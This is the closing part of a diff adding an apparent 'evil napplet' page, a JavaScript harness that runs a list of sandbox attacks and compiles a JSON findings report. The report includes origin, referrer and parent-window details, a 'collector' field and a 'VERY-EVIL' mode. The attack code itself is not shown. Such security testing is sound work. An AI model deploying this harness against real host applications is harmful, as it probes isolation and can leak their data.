+        state.evilResults[a.id] = { error: errMsg(e) };
+        logLine('ERR  ' + a.name + ' → ' + errMsg(e));
+      }
+      updateReport();
+      renderSummary();
+    }
+    logLine('finished. everything above actually happened.');
+    updateReport();
+  }
+
+  /* ---------- report ---------- */
+
+  function buildReport() {
+    return {
+      napplet: window.__EVIL_ID__ || 'unknown',
+      mode: state.veryEvil ? 'VERY-EVIL' : 'demo',
+      at: new Date().toISOString(),
+      collector: state.collector,
+      location: safeGet(() => location.href),
+      origin: safeGet(() => window.origin),
+      referrer: document.referrer,
+      parentLength: safeGet(() => window.parent.length),
+      findings: ATTACKS.map((a) => Object.assign({ id: a.id, name: a.name, severity: a.severity }, state.results[a.id] || {}, { evil: state.evilResults[a.id] || null })),
+    };
+  }
+  function updateReport() {
+    reportText.value = JSON.stringify(buildReport(), null, 2);
+  }
+  document.getElementById('copyReportBtn').addEventListener('click', async () => {
+    try {
+      await navigator.clipboard.writeText(reportText.value);
+    } catch (_) {
+      reportText.select();
+    }
+  });
+  document.getElementById('reportBtn').addEventListener('click', () => {
+    const d = document.getElementById('report');
+    d.open = !d.open;
+  });
+
+  armBtn.addEventListener('click', () => { updateReport(); openConfirm(); });
+  document.getElementById('runAllBtn').addEventListener('click', () => { void runAllDemos(); });
+
+  /* ---------- boot ---------- */
+  renderKit();
+  render();
+  updateReport();
+  void runAllDemos();
+})();
+</script>
+</body>
+</html>
